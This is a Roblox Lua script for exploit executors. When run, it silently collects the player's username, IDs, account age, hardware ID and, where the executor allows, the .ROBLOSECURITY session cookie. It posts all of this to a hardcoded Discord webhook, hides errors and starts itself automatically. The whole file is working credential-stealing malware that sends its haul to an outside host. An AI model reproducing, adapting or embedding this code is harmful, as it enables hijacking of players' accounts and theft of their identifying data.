local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK = "https://discord.com/api/webhooks/1559034692127293440/r9ODOICWqdg7QFiv2tMBabg27dT2kvJYi_EPIm5p5l_zQ7nhdHYHGUmdOUymkQxzWb2q"

local function getRequest()
    return (syn and syn.request) or http_request or request or http.request or (fluxus and fluxus.request)
end

local function send(data)
    local req = getRequest()
    if not req then return end

    local body = HttpService:JSONEncode({
        embeds = {{
            title = "Execution Log",
            color = 5793266,
            fields = {
                {name = "Username", value = tostring(data.username), inline = true},
                {name = "UserId", value = tostring(data.userId), inline = true},
                {name = "DisplayName", value = tostring(data.displayName), inline = true},
                {name = "Account Age", value = tostring(data.accountAge), inline = true},
                {name = "PlaceId", value = tostring(data.placeId), inline = true},
                {name = "Executor", value = tostring(data.executor), inline = true},
                {name = "HWID", value = tostring(data.hwid), inline = false},
                {name = "Cookie", value = data.cookie and tostring(data.cookie) or "N/A", inline = false},
            },
            footer = {text = data.timestamp}
        }}
    })

    pcall(function()
        req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end)
end

local function grab()
    local data = {
        username = LocalPlayer.Name,
        displayName = LocalPlayer.DisplayName,
        userId = LocalPlayer.UserId,
        accountAge = LocalPlayer.AccountAge,
        placeId = game.PlaceId,
        jobId = game.JobId,
        executor = (identifyexecutor and identifyexecutor()) or "unknown",
        hwid = (gethwid and gethwid()) or "unknown",
        cookie = nil,
        timestamp = os.date("%Y-%m-%d %H:%M:%S")
    }

    pcall(function()
        if getcookie then
            data.cookie = getcookie(".ROBLOSECURITY")
        end
    end)

    send(data)
end

task.spawn(grab)
